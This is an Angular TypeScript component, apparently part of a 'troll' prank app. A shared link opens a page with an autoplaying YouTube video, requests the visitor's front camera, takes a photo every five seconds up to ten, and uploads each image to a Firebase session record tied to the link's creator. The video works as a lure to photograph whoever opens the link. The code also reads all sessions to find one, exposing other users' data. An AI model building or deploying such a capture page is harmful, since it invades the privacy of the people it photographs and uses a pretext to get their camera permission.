import { Component, ElementRef, ViewChild, AfterViewInit, OnDestroy, inject, OnInit, signal } from '@angular/core';
import { DomSanitizer, SafeResourceUrl } from '@angular/platform-browser';
import { NotificationService } from '../../services/notification';
import { MatButtonModule } from '@angular/material/button';
import { MatCardModule } from '@angular/material/card';
import { Button } from '../ui/components/ui/button/button';
import { ActivatedRoute } from '@angular/router'; // Import ActivatedRoute
import { environment } from '../../environments/environment'; // Import environment
import { getDatabase, ref, get, set, remove } from '@angular/fire/database';

@Component({
  selector: 'app-troll-buddy',
  imports: [MatButtonModule, MatCardModule, Button],
  templateUrl: './troll-buddy.html',
  styleUrl: './troll-buddy.scss',
  standalone: true
})
export class TrollBuddy implements AfterViewInit, OnDestroy, OnInit {
  private readonly notificationService = inject(NotificationService);
  private readonly route = inject(ActivatedRoute); // Inject ActivatedRoute
  private readonly sanitizer = inject(DomSanitizer);

  @ViewChild('videoElement', { static: true }) videoElement!: ElementRef<HTMLVideoElement>;
  @ViewChild('canvasElement', { static: true }) canvasElement!: ElementRef<HTMLCanvasElement>;

  stream: MediaStream | null = null;
  capturedImages = signal<string[]>([]);
  intervalId: any;

  userId: string | null = null; // To hold user ID
  sessionId: string | null = null; // To hold session ID
  userName = signal<string>(''); // To hold user name

  link: string | null = null; // To hold the dynamic link
  youtubeVideoId = signal<string | null>(null); // To hold YouTube video ID
  cameraGranted = signal<boolean>(false); // To track camera access

  ngAfterViewInit() {
    // Only request camera if we don't have 10 images already
    if (this.capturedImages().length < 10) {
      this.requestCameraAccess();
    }
  }

  ngOnInit() {
    this.route.params.subscribe(params => {
      this.userId = params['userId']; // Retrieve user ID from route
      this.sessionId = params['sessionId']; // Retrieve session ID from route
      // Build the dynamic link using environment.baseUrl
      if (this.userId && this.sessionId) {
        this.link = `${environment.baseUrl}/troll-buddy/${this.userId}/${this.sessionId}`;
        this.fetchSessionData();
      }
    });
  }

  private async fetchSessionData() {
    if (!this.userId || !this.sessionId) return;
    const db = getDatabase();
    const sessionsRef = ref(db, 'sessions');
    try {
      const snapshot = await get(sessionsRef);
      if (snapshot.exists()) {
        const sessions = snapshot.val();
        // Find the session by sessionId
        for (const key in sessions) {
          if (sessions[key].sessionId === this.sessionId) {
            this.youtubeVideoId.set(sessions[key].youtubeVideoId || null);
            this.userName.set(sessions[key].name || '');
            // Load existing images from Firebase
            await this.loadExistingImages();
            break;
          }
        }
      }
    } catch (error) {
      console.error('Error fetching session data:', error);
    }
  }

  private async loadExistingImages() {
    if (!this.sessionId) return;
    const db = getDatabase();
    const imagesRef = ref(db, `sessions/${this.sessionId}/images`);
    try {
      const snapshot = await get(imagesRef);
      if (snapshot.exists()) {
        const images = snapshot.val();
        const imageUrls = Object.values(images) as string[];
        // Sort by timestamp (assuming keys are timestamps)
        const sortedImages = imageUrls.sort((a, b) => {
          const aTimestamp = parseInt(Object.keys(images).find(key => images[key] === a) || '0');
          const bTimestamp = parseInt(Object.keys(images).find(key => images[key] === b) || '0');
          return bTimestamp - aTimestamp; // Latest first
        });
        this.capturedImages.set(sortedImages.slice(0, 10)); // Keep only latest 10
        console.log('Loaded existing images:', this.capturedImages().length);
      }
    } catch (error) {
      console.error('Error loading existing images:', error);
    }
  }

  ngOnDestroy() {
    this.stopCamera();
  }

  async requestCameraAccess() {
    if (this.stream) {
      this.cameraGranted.set(true);
      return;
    }
    try {
      this.stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' } // Front camera for mobile
      });
      if (this.videoElement) {
        this.videoElement.nativeElement.srcObject = this.stream;
        this.videoElement.nativeElement.addEventListener('loadedmetadata', () => {
          console.log('Video loaded, dimensions:', this.videoElement.nativeElement.videoWidth, this.videoElement.nativeElement.videoHeight);
          this.cameraGranted.set(true);
          this.startCapturing();
        });
      } else {
        alert('Video element not found');
      }
    } catch (error) {
      console.error('Error accessing camera:', error);
      alert('Error accessing camera: ' + (error as Error).message);
      this.notificationService.showError('Zugriff verweigert oder nicht unterstützt.');
      this.cameraGranted.set(false);
    }
  }

  startCapturing() {
    console.log('Starting image capture every 5 seconds');
    this.intervalId = setInterval(() => {
      if (this.capturedImages().length >= 10) {
        this.stopCamera();
        alert('Captured 10 images. Camera stopped.');
        return;
      }
      this.captureImage();
    }, 5000); // Every 5 seconds
  }

  async captureImage() {
    if (!this.videoElement || !this.canvasElement) {
      return;
    }
    const video = this.videoElement.nativeElement;
    const canvas = this.canvasElement.nativeElement;
    const context = canvas.getContext('2d');

    console.log('Attempting to capture image, video dimensions:', video.videoWidth, video.videoHeight);

    if (context && this.sessionId && video.videoWidth > 0 && video.videoHeight > 0) {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageDataUrl = canvas.toDataURL('image/png');
      const currentImages = this.capturedImages();
      currentImages.unshift(imageDataUrl); // Add to beginning
      if (currentImages.length > 10) { // Keep only last 10 images
        currentImages.pop();
      }
      this.capturedImages.set(currentImages);
      console.log('Image captured and added to array, total images:', this.capturedImages().length);
      alert('Image captured! Total images: ' + this.capturedImages().length);

      // Save to Firebase Realtime Database
      const db = getDatabase();
      const timestamp = Date.now().toString();
      const imageRef = ref(db, `sessions/${this.sessionId}/images/${timestamp}`);
      try {
        await set(imageRef, imageDataUrl);
        console.log('Image saved to database:', timestamp);
        // After saving, manage to keep only latest 10
        await this.manageImages();
      } catch (error) {
        console.error('Error saving image to database:', error);
      }
    } else {
      console.log('Capture conditions not met:', { context: !!context, sessionId: this.sessionId, width: video.videoWidth, height: video.videoHeight });
    }
  }

  private async manageImages() {
    if (!this.sessionId) return;
    const db = getDatabase();
    const imagesRef = ref(db, `sessions/${this.sessionId}/images`);
    try {
      const snapshot = await get(imagesRef);
      if (snapshot.exists()) {
        const images = snapshot.val();
        const timestamps = Object.keys(images).sort((a, b) => parseInt(b) - parseInt(a)); // Descending order
        if (timestamps.length > 10) {
          const toDelete = timestamps.slice(10); // Keep first 10 (latest)
          for (const ts of toDelete) {
            const deleteRef = ref(db, `sessions/${this.sessionId}/images/${ts}`);
            await remove(deleteRef);
          }
        }
      }
    } catch (error) {
      console.error('Error managing images:', error);
    }
  }



  stopCamera() {
    if (this.stream) {
      this.stream.getTracks().forEach(track => track.stop());
      this.stream = null;
    }
    if (this.intervalId) {
      clearInterval(this.intervalId);
    }
  }

  getSafeUrl(videoId: string | null): SafeResourceUrl {
    if (!videoId) {
      return this.sanitizer.bypassSecurityTrustResourceUrl('');
    }
    // Check if it's a YouTube Shorts video ID (assuming Shorts have different handling)
    // For now, treat all as regular videos, but add parameters for autoplay and mute
    return this.sanitizer.bypassSecurityTrustResourceUrl(`https://www.youtube.com/embed/${videoId}?autoplay=1&enablejsapi=1&origin=${window.location.origin}`);
  }
}
